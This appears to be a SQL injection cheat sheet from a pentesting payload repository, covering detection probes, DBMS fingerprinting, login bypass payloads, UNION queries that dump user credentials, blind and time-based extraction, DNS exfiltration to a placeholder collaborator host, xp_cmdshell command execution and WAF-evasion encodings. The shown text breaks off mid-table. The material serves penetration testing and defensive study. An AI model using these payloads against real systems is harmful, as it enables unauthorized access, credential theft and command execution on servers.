# SQL Injection

> SQL Injection (SQLi)  is a type of security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. SQL Injection is one of the most common and severe types of web application vulnerabilities, enabling attackers to execute arbitrary SQL code on the database. This can lead to unauthorized data access, data manipulation, and, in some cases, full compromise of the database server.


## Summary

* [CheatSheets](#cheatsheets)
    * [MSSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)
    * [MySQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)
    * [OracleSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md)
    * [PostgreSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md)
    * [SQLite Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)
    * [Cassandra Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Cassandra%20Injection.md)
    * [DB2 Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/DB2%20Injection.md)
    * [SQLmap](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLmap%20Cheatsheet.md)
* [Tools](#tools)
* [Entry Point Detection](#entry-point-detection)
* [DBMS Identification](#dbms-identification)
* [Authentication Bypass](#authentication-bypass)
    * [Raw MD5 and SHA1](#raw-md5-and-sha1)
* [UNION Based Injection](#union-based-injection)
* [Error Based Injection](#error-based-injection)
* [Blind Injection](#blind-injection)
    * [Boolean Based Injection](#boolean-based-injection)
    * [Blind Error Based Injection](#blind-error-based-injection)
    * [Time Based Injection](#time-based-injection)
    * [Out of Band (OAST)](#out-of-band-oast)
* [Stack Based Injection](#stack-based-injection)
* [Polyglot Injection](#polyglot-injection)
* [Routed Injection](#routed-injection)
* [Second Order SQL Injection](#second-order-sql-injection)
* [Generic WAF Bypass](#generic-waf-bypass)
    * [White Spaces](#white-spaces)
    * [No Comma Allowed](#no-comma-allowed)
    * [No Equal Allowed](#no-equal-allowed)
    * [Case Modification](#case-modification)
* [Labs](#labs)
* [References](#references)


## Tools

* [sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap) - Automatic SQL injection and database takeover tool
* [r0oth3x49/ghauri](https://github.com/r0oth3x49/ghauri) - An advanced cross-platform tool that automates the process of detecting and exploiting SQL injection security flaws


## Entry Point Detection

Detecting the entry point in SQL injection (SQLi) involves identifying locations in an application where user input is not properly sanitized before it is included in SQL queries.

* **Error Messages**: Inputting special characters (e.g., a single quote ') into input fields might trigger SQL errors. If the application displays detailed error messages, it can indicate a potential SQL injection point.
    * Simple characters: `'`, `"`, `;`, `)` and `*`
    * Simple characters encoded: `%27`, `%22`, `%23`, `%3B`, `%29` and `%2A`
    * Multiple encoding: `%%2727`, `%25%27`
    * Unicode characters: `U+02BA`, `U+02B9`
        * MODIFIER LETTER DOUBLE PRIME (`U+02BA` encoded as `%CA%BA`) is transformed into `U+0022` QUOTATION MARK (`)
        * MODIFIER LETTER PRIME (`U+02B9` encoded as `%CA%B9`) is transformed into `U+0027` APOSTROPHE (')

* **Tautology-Based SQL Injection**: By inputting tautological (always true) conditions, you can test for vulnerabilities. For instance, entering `admin' OR '1'='1` in a username field might log you in as the admin if the system is vulnerable.
    * Merging characters
      ```sql
      `+HERP
      '||'DERP
      '+'herp
      ' 'DERP
      '%20'HERP
      '%2B'HERP
      ```
    * Logic Testing
      ```sql
      page.asp?id=1 or 1=1 -- true
      page.asp?id=1' or 1=1 -- true
      page.asp?id=1" or 1=1 -- true
      page.asp?id=1 and 1=2 -- false
      ```

* **Timing Attacks**: Inputting SQL commands that cause deliberate delays (e.g., using `SLEEP` or `BENCHMARK` functions in MySQL) can help identify potential injection points. If the application takes an unusually long time to respond after such input, it might be vulnerable.


## DBMS Identification

### DBMS Identification Keyword Based

Certain SQL keywords are specific to particular database management systems (DBMS). By using these keywords in SQL injection attempts and observing how the website responds, you can often determine the type of DBMS in use.

| DBMS                | SQL Payload                     |
| ------------------- | ------------------------------- |
| MySQL               | `conv('a',16,2)=conv('a',16,2)` |
| MySQL               | `connection_id()=connection_id()` |
| MySQL               | `crc32('MySQL')=crc32('MySQL')` |
| MSSQL               | `BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)` |
| MSSQL               | `@@CONNECTIONS>0` |
| MSSQL               | `@@CONNECTIONS=@@CONNECTIONS` |
| MSSQL               | `@@CPU_BUSY=@@CPU_BUSY` |
| MSSQL               | `USER_ID(1)=USER_ID(1)` |
| ORACLE              | `ROWNUM=ROWNUM` |
| ORACLE              | `RAWTOHEX('AB')=RAWTOHEX('AB')` |
| ORACLE              | `LNNVL(0=123)` |
| POSTGRESQL          | `5::int=5` |
| POSTGRESQL          | `5::integer=5` |
| POSTGRESQL          | `pg_client_encoding()=pg_client_encoding()` |
| POSTGRESQL          | `get_current_ts_config()=get_current_ts_config()` |
| POSTGRESQL          | `quote_literal(42.5)=quote_literal(42.5)` |
| POSTGRESQL          | `current_database()=current_database()` |
| SQLITE              | `sqlite_version()=sqlite_version()` |
| SQLITE              | `last_insert_rowid()>1` |
| SQLITE              | `last_insert_rowid()=last_insert_rowid()` |
| MSACCESS            | `val(cvar(1))=1` |
| MSACCESS            | `IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0` |


### DBMS Identification Error Based

Different DBMSs return distinct error messages when they encounter issues. By triggering errors and examining the specific messages sent back by the database, you can often identify the type of DBMS the website is using.

| DBMS                | Example Error Message                                                                    | Example Payload |
| ------------------- | -----------------------------------------------------------------------------------------|-----------------|
| MySQL               | `You have an error in your SQL syntax; ... near '' at line 1`                            | `'`             |
| PostgreSQL          | `ERROR: unterminated quoted string at or near "'"`                                       | `'`             |
| PostgreSQL          | `ERROR: syntax error at or near "1"`                                                     | `1'`            |
| Microsoft SQL Server| `Unclosed quotation mark after the character string ''.`                                 | `'`             |
| Microsoft SQL Server| `Incorrect syntax near ''.`                                                              | `'`             |
| Microsoft SQL Server| `The conversion of the varchar value to data type int resulted in an out-of-range value.`| `1'`            |
| Oracle              | `ORA-00933: SQL command not properly ended`                                              | `'`             |
| Oracle              | `ORA-01756: quoted string not properly terminated`                                       | `'`             |
| Oracle              | `ORA-00923: FROM keyword not found where expected`                                       | `1'`            |



## Authentication Bypass

In a standard authentication mechanism, users provide a username and password. The application typically checks these credentials against a database. For example, a SQL query might look something like this: 

```SQL
SELECT * FROM users WHERE username = 'user' AND password = 'pass';
```

An attacker can attempt to inject malicious SQL code into the username or password fields. For instance, if the attacker types the following in the username field:

```sql
' OR '1'='1
```

And leaves the password field empty, the resulting SQL query executed might look like this:

```SQL
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '';
```

Here, `'1'='1'` is always true, which means the query could return a valid user, effectively bypassing the authentication check.

:warning: In this case, the database will return an array of results because it will match every users in the table. This will produce an error in the server side since it was expecting only one result. By adding a `LIMIT` clause, you can restrict the number of rows returned by the query. By submitting the following payload in the username field, you will log in as the first user in the database. Additionally, you can inject a payload in the password field while using the correct username to target a specific user. 

```sql
' or 1=1 limit 1 --
```

:warning: Avoid using this payload indiscriminately, as it always returns true. It could interact with endpoints that may inadvertently delete sessions, files, configurations, or database data.

* [PayloadsAllTheThings/SQL Injection/Intruder/Auth_Bypass.txt](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Intruder/Auth_Bypass.txt)


### Raw MD5 and SHA1

In PHP, if the optional `binary` parameter is set to true, then the `md5` digest is instead returned in raw binary format with a length of 16. Let's take this PHP code where the authentication is checking the MD5 hash of the password submitted by the user.

```php
sql = "SELECT * FROM admin WHERE pass = '".md5($password,true)."'";
```

An attacker can craft a payload where the result of the `md5($password,true)` function will contain a quote and escape the SQL context, for example with `' or 'SOMETHING`.


| Hash | Input    | Output (Raw)            |  Payload  |
| ---- | -------- | ----------------------- | --------- |
| md5  | ffifdyop | `'or'6�]��!r,��b`       | `'or'`    |
| md5  | 129581926211651571912466741651878684928 | `ÚT0Do#ßÁ'or'8` | `'or'` |
| sha1 | 3fDf     | `Q�u'='�@�[�t�- o��_-!` | `'='`     |
| sha1 | 178374   | `ÜÛ¾}_ia!8Wm'/*´Õ`      | `'/*`     |
| sha1 | 17       | `Ùp2ûjww%6\`            | `\`       |

This behavior can be abused to bypass the authentication by escaping the context.

```php
sql1 = "SELECT * FROM admin WHERE pass = '".md5("ffifdyop", true)."'";
sql1 = "SELECT * FROM admin WHERE pass = ''or'6�]��!r,��b'";
```


## UNION Based Injection

In a standard SQL query, data is retrieved from one table. The `UNION` operator allows multiple `SELECT` statements to be combined. If an application is vulnerable to SQL injection, an attacker can inject a crafted SQL query that appends a `UNION` statement to the original query.

Let's assume a vulnerable web application retrieves product details based on a product ID from a database: 

```sql
SELECT product_name, product_price FROM products WHERE product_id = 'input_id';
```

An attacker could modify the `input_id` to include the data from another table like `users`.

```SQL
1' UNION SELECT username, password FROM users --
```

After submitting our payload, the query become the following SQL:

```SQL
SELECT product_name, product_price FROM products WHERE product_id = '1' UNION SELECT username, password FROM users --';
```

:warning: The 2 SELECT clauses must have the same number of columns.


## Error Based Injection

Error-Based SQL Injection is a technique that relies on the error messages returned from the database to gather information about the database structure. By manipulating the input parameters of an SQL query, an attacker can make the database generate error messages. These errors can reveal critical details about the database, such as table names, column names, and data types, which can be used to craft further attacks.

For example, on a PostgreSQL, injecting this payload in a SQL query would result in an error since the LIMIT clause is expecting a numeric value.

```sql
LIMIT CAST((SELECT version()) as numeric) 
```

The error will leak the output of the `version()`.

```ps1
ERROR: invalid input syntax for type numeric: "PostgreSQL 9.5.25 on x86_64-pc-linux-gnu"
```


## Blind Injection

Blind SQL Injection is a type of SQL Injection attack that asks the database true or false questions and determines the answer based on the application's response. 


### Boolean Based Injection

Attacks rely on sending an SQL query to the database, making the application return a different result depending on whether the query returns TRUE or FALSE. The attacker can infer information based on differences in the behavior of the application.

Size of the page, HTTP response code, or missing parts of the page are strong indicators to detect whether the Boolean-based Blind SQL injection was successful.

Here is a naive example to recover the content of the `@@hostname` variable.

**Identify Injection Point and Confirm Vulnerability** : Inject a payload that evaluates to true/false to confirm SQL injection vulnerability. For example: 

```ps1
http://example.com/item?id=1 AND 1=1 -- (Expected: Normal response)
http://example.com/item?id=1 AND 1=2 -- (Expected: Different response or error)
```
 
**Extract Hostname Length**: Guess the length of the hostname by incrementing until the response indicates a match. For example: 

```ps1
http://example.com/item?id=1 AND LENGTH(@@hostname)=1 -- (Expected: No change)
http://example.com/item?id=1 AND LENGTH(@@hostname)=2 -- (Expected: No change)
http://example.com/item?id=1 AND LENGTH(@@hostname)=N -- (Expected: Change in response)
```

**Extract Hostname Characters** : Extract each character of the hostname using substring and ASCII comparison: 

```ps1
http://example.com/item?id=1 AND ASCII(SUBSTRING(@@hostname, 1, 1)) > 64 -- 
http://example.com/item?id=1 AND ASCII(SUBSTRING(@@hostname, 1, 1)) = 104 -- 
```
 
Then repeat the method to discover every characters of the `@@hostname`. Obviously this example is not the fastest way to obtain them. Here are a few pointers to speed it up:

- Extract characters using dichotomy: it reduces the number of requests from linear to logarithmic time, making data extraction much more efficient. 


### Blind Error Based Injection

Attacks rely on sending an SQL query to the database, making the application return a different result depending on whether the query returned successfully or triggered an error. In this case, we only infer the success from the server's answer, but the data is not extracted from output of the error.


**Example**: Using `json()` function in SQLite to trigger an error as an oracle to know when the injection is true or false.

```sql
' AND CASE WHEN 1=1 THEN 1 ELSE json('') END AND 'A'='A -- OK
' AND CASE WHEN 1=2 THEN 1 ELSE json('') END AND 'A'='A -- malformed JSON
```


### Time Based Injection

Time-based SQL Injection is a type of blind SQL Injection attack that relies on database delays to infer whether certain queries return true or false. It is used when an application does not display any direct feedback from the database queries but allows execution of time-delayed SQL commands. The attacker can analyze the time it takes for the database to respond to indirectly gather information from the database.

* Default `SLEEP` function for the database

```sql
' AND SLEEP(5)/*
' AND '1'='1' AND SLEEP(5)
' ; WAITFOR DELAY '00:00:05' --
```

* Heavy queries that take a lot of time to complete, usually crypto functions.

```sql
BENCHMARK(2000000,MD5(NOW()))
```

Let's see a basic example to recover the version of the database using a time based sql injection.

```sql
http://example.com/item?id=1 AND IF(SUBSTRING(VERSION(), 1, 1) = '5', BENCHMARK(1000000, MD5(1)), 0) --
```

If the server's response is taking a few seconds before getting received, then the version is starting is by '5'.


### Out of Band (OAST)

Out-of-Band SQL Injection (OOB SQLi) occurs when an attacker uses alternative communication channels to exfiltrate data from a database. Unlike traditional SQL injection techniques that rely on immediate responses within the HTTP response, OOB SQL injection depends on the database server's ability to make network connections to an attacker-controlled server. This method is particularly useful when the injected SQL command's results cannot be seen directly or the server's responses are not stable or reliable. 

Different databases offer various methods for creating out-of-band connections, the most common technique is the DNS exfiltration: 

* MySQL

  ```sql
  LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
  SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
  ```

* MSSQL

  ```sql
  SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
  exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
  ```


## Stacked Based Injection

Stacked Queries SQL Injection is a technique where multiple SQL statements are executed in a single query, separated by a delimiter such as a semicolon (`;`). This allows an attacker to execute additional malicious SQL commands following a legitimate query. Not all databases or application configurations support stacked queries.

```sql
1; EXEC xp_cmdshell('whoami') --
```


## Polyglot Injection

A polygot SQL injection payload is a specially crafted SQL injection attack string that can successfully execute in multiple contexts or environments without modification. This means that the payload can bypass different types of validation, parsing, or execution logic in a web application or database by being valid SQL in various scenarios.

```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```


## Routed Injection

> Routed SQL injection is a situation where the injectable query is not the one which gives output but the output of injectable query goes to the query which gives output. - Zenodermus Javanicus

In short, the result of the first SQL query is used to build the second SQL query. The usual format is `' union select 0xHEXVALUE --` where the HEX is the SQL injection for the second query.

**Example 1**:

`0x2720756e696f6e2073656c65637420312c3223` is the hex encoded of `' union select 1,2#`

```sql
' union select 0x2720756e696f6e2073656c65637420312c3223#
```

**Example 2**:

`0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061` is the hex encoded of `-1' union select login,password from users-- a`.

```sql
-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
```


## Second Order SQL Injection

Second Order SQL Injection is a subtype of SQL injection where the malicious SQL payload is primarily stored in the application's database and later executed by a different functionality of the same application.

```py
username="anything' UNION SELECT Username, Password FROM Users;--"
password="P@ssw0rd"
```

Since you are inserting your payload in the database for a later use, any other type of injections can be used UNION, ERROR, BLIND, STACKED, etc.


## Generic WAF Bypass

### White Spaces

Bypass using whitespace alternatives.

| Bypass                   | Technique              |
| ------------------------ | ---------------------- |
| `?id=1%09and%091=1%09--` | Whitespace alternative |
| `?id=1%0Aand%0A1=1%0A--` | Whitespace alternative |
| `?id=1%0Band%0B1=1%0B--` | Whitespace alternative |
| `?id=1%0Cand%0C1=1%0C--` | Whitespace alternative |
| `?id=1%0Dand%0D1=1%0D--` | Whitespace alternative |
| `?id=1%A0and%A01=1%A0--` | Whitespace alternative |
| `?id=1%A0and%A01=1%A0--` | Whit